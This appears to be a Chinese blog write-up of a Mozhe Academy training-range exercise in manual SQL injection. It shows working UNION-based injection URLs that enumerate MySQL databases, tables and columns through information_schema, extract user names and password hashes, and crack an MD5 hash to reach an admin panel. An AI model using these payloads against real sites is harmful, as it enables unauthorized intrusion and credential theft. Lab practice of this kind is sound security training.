---
title: 墨者学院--手工注入mysql数据库实例
date: 2018-10-23 23:37:27
categories: WEB安全
tags: 手工挖掘漏洞

---
## 发现漏洞
﻿开启墨者靶场环境,发现此界面,在点击登陆下方的通知之后惊奇的看到存在参数id,可以试试通过传递SQL语句获取数据库信息.
![](1.png)
![](2.png)
## 注入测试
我们可以试试1=1和1=2大法,输入在参数id=1后面加入1=1进行逻辑判断
![](3.png)
显示正常,然后换1=2,因为1=2为一个假命题,如果能插入到数据库进行逻辑判断,那么由于该语句错误,数据库查询不到任何信息,界面就不会显示任何信息
![](4.png)
根据这种情况可以大概的判断出该网站很大可能存在SQL注入漏洞.
我们可以大概的猜测出该web页面中背后的SQL语句为

```
select  column1,column2..... from table  where id=$_GET["id"]
```
然后通过order by判断出该SQL语句查询有多少列(或者说查询多少个字段),
order by用于对筛选出来的结果按照列(关键字)进行排序,对于多列的时候，先按照第一个column name排序，如果第一个column name相同,则按照第二个column name排序,我们输入:

```
http://219.153.49.228:42182/new_list.php?id=1 order by 1,2,3,4,5
#假设该SQL语句中查询了5个关键字,如果没报错,那么表示所查询的关键字大于或者等于5,如果报错表示查询的小于5
```
![](5.png)
出现报错,表示所选择的关键字小于5,我们换成3,可以正确显示其界面,换成4也可以正常显示,所以可以得出所选择的关键字个数为4.
那么其SQL语句为:

```
select column1,column2,column3,column4 from table where id=$_GET("id")
```
接下来判断在页面中可以显示的关键字
![](6.png)
其SQL语句为:

```
select column1,column2,column3,column4 from table where id=5 union select 1,2,3,4
```

注:由上面的操作得出该SQL语句查询4个关键字,我们将id=5,则对于第一个SQL语句由于不满足where条件而不显示其内容,所以执行第二条语句,select 1,2,3,4就是判断在页面中显示的是哪些关键字.![](7.png))
由这个信息可以得出显示的是第二个和第三个字段的内容
## 获取数据库信息
我们将第二个和第三个字段换成MySQL数据库中的函数,即可获取其数据库的信息
使用user()函数可以得知当前数据库的使用者
使用database()函数可以得知当时数据库的名称
![](8.png))
该MYSQL数据库名叫mozhe_Discuz_StormGroup,当前使用者为root
在MYSQL数据库中有一个数据库叫information_schema数据库,它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。可以简单的理解为数据词典或者系统目录.


![](9.png))
其命令为:

```
http://219.153.49.228:42182/new_list.php
?id= 5 union select 1, schema_name ,3,4 from information_schema.schemata limit 0,1
```
注:limit 0,1表示从第0行起,取第一行数据,第一行为information_schema,举个例子:
![](10.png))
limit 0,1即就是指dvwa数据库
limit1,1即就是information_schema数据库
回到原来的注入问题,我们将limit 0,1换成limit 1,1   limit 2,2  limit 3,3  limit 4,4 information_schema,mozhe_Discuz_StormGroup,mysql,performance_schema,sys这五个数据库,当输入limit5,5页面没有内容表示目前拥有五个数据库.
然后枚举数据库中的数据表
注入的URL为:

```
http://219.153.49.228:43635/new_list.php?id=5  union select 1,table_name,3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup' limit 0,1
```
获得mozhe_Discuz_StormGroup数据库的第一张表为StormGroup_member
![](11.png))
将0,1替换为1,1所得到的数据表为notice,替换成2,2则没有显示任何数据表示该数据库只有两张表.
所以得到数据库mozhe_Discuz_StormGroup中有两张表为StormGroup_member和notice表,那么我们查其列.
```
http://219.153.49.228:43635/new_list.php?id=5  union select 1,column_name,3,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1
```
![](12.png)
得到在其StormGroup_member表下有个列为id,我们将0,1替换成1,1   2,2    3,3   得到的列分别是name,password,status
那么可以得知在mozhe_Discuz_StormGroup数据库的StormGroup_member表下有四列分别是id,name,password,status

```
http://219.153.49.228:43635/new_list.php
?id=5  union select 1,name,3,4 from  StormGroup_member  limit 0,1
```
![](13.png))
查找其密码列

```
http://219.153.49.228:43635/new_list.php?id=5  union select 1,password,3,4 from  StormGroup_member  limit 0,1
```
![](14.png))
将此密码进行MD5解密可得明文密码
![](15.png))
然后我们就可以进入后台管理系统啦
![](16.png)
